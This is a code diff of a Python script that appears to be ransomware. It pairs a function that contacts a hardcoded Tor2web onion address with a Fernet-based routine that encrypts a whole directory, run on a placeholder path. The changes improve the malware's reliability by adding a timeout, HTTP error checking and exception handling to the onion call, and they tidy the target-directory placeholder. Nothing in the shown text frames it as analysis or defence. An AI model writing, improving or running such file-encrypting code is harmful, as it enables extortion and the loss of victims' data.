@@ -6,9 +6,13 @@ import time
 from cryptography.fernet import Fernet
 
 # Function to connect to Tor2web
-def connect_to_tor2web(url):
-    response = requests.get(url)
-    print(response.text)
+def connect_to_tor2web(url, timeout=4):
+    try:
+        response = requests.get(url,timeout=timeout)
+        response.raise_for_status() #Raise an httperror for bad responses
+        print(response.text)
+    except requests.exceptions.RequestException as e:
+        print(f"Error connecting to {url}: {e}")
 
 # Function to encrypt a file directory
 def encrypt_directory(directory_to_encrypt):
@@ -64,7 +68,7 @@ def encrypt_directory(directory_to_encrypt):
 connect_to_tor2web("https://duskgytldkxiuqc6.onion.to/")
 
 # Encrypt a file directory
-directory_to_encrypt = "DIRECTORY TO ENCRYPT"
+directory_to_encrypt = "DIRECTORY_TO_ENCRYPT"
 encrypt_directory(directory_to_encrypt)
 
 print("Done")
